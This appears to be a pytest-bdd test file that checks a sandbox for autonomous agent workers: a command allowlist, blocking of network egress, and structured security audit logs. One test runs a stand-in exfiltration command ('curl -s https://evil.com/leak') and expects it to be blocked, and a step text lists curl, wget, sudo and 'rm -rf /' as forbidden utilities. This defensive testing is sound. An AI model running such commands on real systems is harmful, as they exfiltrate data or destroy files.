"""Executable BDD scenarios using pytest-bdd for worker process sandboxing (US-0054, US-0109)."""

from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

import pytest
from pytest_bdd import given, scenarios, then, when

from spec_ops.config.loader import load_config
from spec_ops.security import ExecutionSandbox, isolated_network

scenarios(
    "features/us_0054_worker_sandboxing.feature",
    "features/us_0109_worker_sandboxing_interceptors.feature",
)


@pytest.fixture
def sandbox_bdd_ctx(tmp_path: Path) -> dict[str, Any]:
    """Shared context for sandboxing BDD scenarios."""
    worktree = tmp_path / ".worktrees" / "task-0025"
    worktree.mkdir(parents=True, exist_ok=True)
    return {
        "root": tmp_path,
        "worktree": worktree,
        "config": None,
        "sandbox": None,
        "result": None,
        "preflight_result": None,
        "preflight_log": "",
        "allowlisted_results": [],
    }


# --- Given Steps ---


@given(
    '"specops.toml" configures "[execution.sandbox]" with allowed_commands = ["uv", "git", "pytest", "ruff"]'
)
def configure_sandbox_allowlist(sandbox_bdd_ctx: dict[str, Any]):
    root = sandbox_bdd_ctx["root"]
    toml_content = """[project]
name = "SandboxedProject"

[execution.sandbox]
enabled = true
allowed_commands = ["uv", "git", "pytest", "ruff"]
isolate_network = false
"""
    (root / "specops.toml").write_text(toml_content, encoding="utf-8")
    cfg = load_config(root_dir=root)
    sandbox_bdd_ctx["config"] = cfg
    sandbox_bdd_ctx["sandbox"] = ExecutionSandbox(
        worktree_dir=sandbox_bdd_ctx["worktree"],
        allowed_commands=cfg.execution.sandbox.allowed_commands,
        isolate_network=cfg.execution.sandbox.isolate_network,
    )


@given('"specops.toml" sets "[execution.sandbox] isolate_network = true"')
def configure_sandbox_isolate_network(sandbox_bdd_ctx: dict[str, Any]):
    root = sandbox_bdd_ctx["root"]
    toml_content = """[project]
name = "IsolatedProject"

[quality]
preflight = ["pytest"]

[execution.sandbox]
enabled = true
allowed_commands = ["uv", "git", "pytest", "ruff", "python", "python3"]
isolate_network = true
"""
    (root / "specops.toml").write_text(toml_content, encoding="utf-8")
    cfg = load_config(root_dir=root)
    sandbox_bdd_ctx["config"] = cfg
    sandbox_bdd_ctx["sandbox"] = ExecutionSandbox(
        worktree_dir=sandbox_bdd_ctx["worktree"],
        allowed_commands=cfg.execution.sandbox.allowed_commands,
        isolate_network=True,
    )


@given("an autonomous worker executing within the hardened process sandbox")
def autonomous_worker_in_sandbox(sandbox_bdd_ctx: dict[str, Any]):
    root = sandbox_bdd_ctx["root"]
    toml_content = """[project]
name = "AllowlistedWorkerProject"

[execution.sandbox]
enabled = true
allowed_commands = ["uv", "git", "pytest", "ruff", "echo"]
isolate_network = false
"""
    (root / "specops.toml").write_text(toml_content, encoding="utf-8")
    cfg = load_config(root_dir=root)
    sandbox_bdd_ctx["config"] = cfg
    sandbox_bdd_ctx["sandbox"] = ExecutionSandbox(
        worktree_dir=sandbox_bdd_ctx["worktree"],
        allowed_commands=["uv", "git", "pytest", "ruff", "echo"],
        isolate_network=False,
    )


# --- When Steps ---


@when(
    'an autonomous agent process attempts to invoke a forbidden utility like "curl", "wget", "sudo", or "rm -rf /"'
)
def invoke_forbidden_utility(sandbox_bdd_ctx: dict[str, Any]):
    sandbox: ExecutionSandbox = sandbox_bdd_ctx["sandbox"]
    # Attempt prohibited command
    res = sandbox.run("curl -s https://evil.com/leak", shell=False)
    sandbox_bdd_ctx["result"] = res


@when("the worker executes the test preflight suite")
@when("the worker engine executes the test preflight verification suite in an isolated worktree")
def execute_test_preflight_suite(sandbox_bdd_ctx: dict[str, Any]):
    sandbox: ExecutionSandbox = sandbox_bdd_ctx["sandbox"]
    wt = sandbox_bdd_ctx["worktree"]

    # Create a test script that attempts external egress
    test_file = wt / "test_egress.py"
    test_file.write_text(
        """import urllib.request
import pytest

def test_outbound_egress():
    # Attempting unexpected external network egress
    urllib.request.urlopen("http://93.184.216.34", timeout=2)
""",
        encoding="utf-8",
    )

    cmd = f"{sys.executable} -m pytest {test_file}"
    ok, log = sandbox.run_preflight_suite([cmd], cwd=wt)
    sandbox_bdd_ctx["preflight_result"] = ok
    sandbox_bdd_ctx["preflight_log"] = log


@when('the worker executes allowlisted commands "uv run pytest" and "git status"')
def execute_allowlisted_commands(sandbox_bdd_ctx: dict[str, Any]):
    sandbox: ExecutionSandbox = sandbox_bdd_ctx["sandbox"]
    wt = sandbox_bdd_ctx["worktree"]

    # Initialize a clean git repo in worktree to support git status
    subprocess.run(["git", "init"], cwd=wt, capture_output=True, check=True)

    results = []
    # Test git status
    start = time.perf_counter()
    r1 = sandbox.run("git status", cwd=wt, shell=False)
    lat1 = (time.perf_counter() - start) * 1000.0
    results.append(("git status", r1, lat1))

    # Test allowlisted tool invocation
    start = time.perf_counter()
    r2 = sandbox.run("uv run pytest --version", cwd=wt, shell=False)
    lat2 = (time.perf_counter() - start) * 1000.0
    results.append(("uv run pytest --version", r2, lat2))

    sandbox_bdd_ctx["allowlisted_results"] = results


# --- Then Steps ---


@then("the process sandbox execution interceptor blocks the command")
@then("the process sandbox execution interceptor intercepts and aborts the subshell invocation")
def verify_command_blocked(sandbox_bdd_ctx: dict[str, Any]):
    res = sandbox_bdd_ctx["result"]
    assert res is not None
    assert res.returncode == 126


@then('writes a security alert event to ".worktrees/<task-id>/.security-audit.log"')
def verify_audit_log_written(sandbox_bdd_ctx: dict[str, Any]):
    wt: Path = sandbox_bdd_ctx["worktree"]
    log_path = wt / ".security-audit.log"
    assert log_path.is_file(), f"Audit log not found at {log_path}"
    content = log_path.read_text(encoding="utf-8")
    assert "SECURITY_ALERT_COMMAND_PROHIBITED" in content


@then(
    'writes a structured security alert event to ".worktrees/<task-id>/.security-audit.log" with command string, parent PID, and timestamp'
)
def verify_structured_audit_log(sandbox_bdd_ctx: dict[str, Any]):
    wt: Path = sandbox_bdd_ctx["worktree"]
    log_path = wt / ".security-audit.log"
    assert log_path.is_file()
    lines = [line.strip() for line in log_path.read_text(encoding="utf-8").splitlines() if line.strip()]
    assert len(lines) > 0
    event_data = json.loads(lines[-1])
    assert "command" in event_data
    assert "curl" in event_data["command"]
    assert "parent_pid" in event_data
    assert event_data["parent_pid"] > 0
    assert "timestamp" in event_data
    assert event_data["exit_code"] == 126
    assert event_data["prohibited_binary"] == "curl"


@then("terminates the worker attempt with exit code 126 (Command Prohibited).")
def verify_exit_code_126(sandbox_bdd_ctx: dict[str, Any]):
    res = sandbox_bdd_ctx["result"]
    assert res.returncode == 126


@then(
    "terminates the worker attempt with exit code 126 (Command Prohibited) and diagnostic error output."
)
def verify_exit_code_126_and_diagnostic(sandbox_bdd_ctx: dict[str, Any]):
    res = sandbox_bdd_ctx["result"]
    assert res.returncode == 126
    assert "Command Prohibited" in res.stderr
    assert "curl" in res.stderr


@then("network socket calls to non-loopback addresses are blocked")
@then("all outbound TCP and UDP socket connections to non-loopback addresses are blocked by the network sandbox")
def verify_network_socket_calls_blocked(sandbox_bdd_ctx: dict[str, Any]):
    # Verify via context manager in this process
    with isolated_network():
        with pytest.raises(PermissionError) as exc_info:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect(("93.184.216.34", 80))
            finally:
                s.close()
        assert "Architectural boundary violation" in str(exc_info.value)


@then("any test attempting unexpected external network egress fails cleanly as an architectural violation.")
@then("any test attempting unexpected external network egress fails cleanly as an architectural boundary violation.")
def verify_test_fails_architectural_violation(sandbox_bdd_ctx: dict[str, Any]):
    ok = sandbox_bdd_ctx["preflight_result"]
    log = sandbox_bdd_ctx["preflight_log"]
    assert ok is False
    assert "Architectural boundary violation" in log or "PermissionError" in log


@then("the commands execute with zero latency degradation and standard stream redirection")
def verify_commands_zero_latency(sandbox_bdd_ctx: dict[str, Any]):
    results = sandbox_bdd_ctx["allowlisted_results"]
    for name, res, lat in results:
        assert res.returncode == 0, f"Command {name} failed: {res.stderr}"


@then("stdout and stderr outputs are captured cleanly into the task execution log.")
def verify_stdout_stderr_captured(sandbox_bdd_ctx: dict[str, Any]):
    results = sandbox_bdd_ctx["allowlisted_results"]
    for name, res, _ in results:
        # Verify output was captured into CompletedProcess stdout/stderr
        assert isinstance(res.stdout, str)
        assert isinstance(res.stderr, str)
        if name == "git status":
            assert "On branch" in res.stdout
